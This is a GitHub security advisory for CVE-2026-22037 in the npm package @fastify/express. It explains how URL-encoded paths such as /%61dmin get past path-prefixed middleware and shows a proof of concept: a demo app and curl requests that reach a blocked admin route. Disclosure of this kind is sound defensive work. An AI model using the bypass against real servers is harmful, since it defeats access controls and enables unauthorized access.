# [H] @fastify/express vulnerable to Improper Handling of URL Encoding (Hex Encoding)

## Summary
Severity: High
Advisory: GHSA-g6q3-96cp-5r5m
CVE: CVE-2026-22037
CWE: CWE-177, CWE-288
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:L (CVSS_V3)
Published: 2026-01-20
Source: https://github.com/advisories/GHSA-g6q3-96cp-5r5m
Type: github-advisory

## Affected
- npm: `@fastify/express` — affected >=0 <4.0.3

## Details
### Summary
A security vulnerability exists in `@fastify/express` where middleware registered with a specific path prefix can be bypassed using URL-encoded characters (e.g., `/%61dmin` instead of `/admin`). While the middleware engine fails to match the encoded path and skips execution, the underlying Fastify router correctly decodes the path and matches the route handler, allowing attackers to access protected endpoints without the middleware constraints.

### Details
The vulnerability is caused by how `@fastify/express` matches requests against registered middleware paths.

### PoC
**Step 1:** Run the following Fastify application (save as `app.js`):

```javascript
const fastify = require('fastify')({ logger: true });

async function start() {
  // Register fastify-express for Express-style middleware support
  await fastify.register(require('@fastify/express'));

  // Middleware to block /admin route
  fastify.use('/admin', (req, res, next) => {
    res.statusCode = 403;
    res.end('Forbidden: Access to /admin is blocked');
  });

  // Sample routes
  fastify.get('/', async (request, reply) => {
    return { message: 'Welcome to the homepage' };
  });

  fastify.get('/admin', async (request, reply) => {
    return { message: 'Admin panel' };
  });

  fastify.get('/admin/dashboard', async (request, reply) => {
    return { message: 'Admin dashboard' };
  });

  // Start server
  try {
    await fastify.listen({ port: 3000 });
  } catch (err) {
    fastify.log.error(err);
    process.exit(1);
  }
}

start();
```

**Step 2:** Execute the attack.

```
➜  ~ curl http://206.189.140.29:3000/%61dmin
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /%61dmin</pre>
</body>
</html>

(fastify express)

➜  ~ curl http://206.189.140.29:3000/%61dmin
{"message":"Admin panel"}
```

It differs from [CVE-2026-22031](https://nvd.nist.gov/vuln/detail/CVE-2026-22031) because this is a different npm module with its own code.

## References
- https://github.com/fastify/fastify-express/security/advisories/GHSA-g6q3-96cp-5r5m
- https://nvd.nist.gov/vuln/detail/CVE-2026-22037
- https://github.com/fastify/fastify-express/commit/dc02a3fe1387f945143f22597baa42557d549a40
- https://github.com/fastify/fastify-express
- https://github.com/fastify/fastify-express/releases/tag/v4.0.3
